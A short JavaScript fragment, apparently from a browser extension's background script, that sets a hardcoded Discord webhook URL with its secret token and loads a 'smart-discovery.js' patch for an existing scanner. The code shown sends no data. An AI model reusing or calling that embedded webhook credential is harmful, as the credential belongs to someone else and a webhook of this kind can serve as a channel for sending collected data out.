self.DISCORD_WEBHOOK_URL =
"https://discordapp.com/api/webhooks/1541539498138013806/yeSV_CJfC5yv6WLwes8QMXIsRoVy9-vM2L_cGqS_e6it-EqBUJLN9stwkDe5eVqZYRbi";

// Load the smart discovery patch without risking the existing scanner.
try {
  importScripts("smart-discovery.js");
} catch (err) {
  console.error(
    "[SMART DISCOVERY] Load failed; existing scanner remains active:",
    err
  );
}
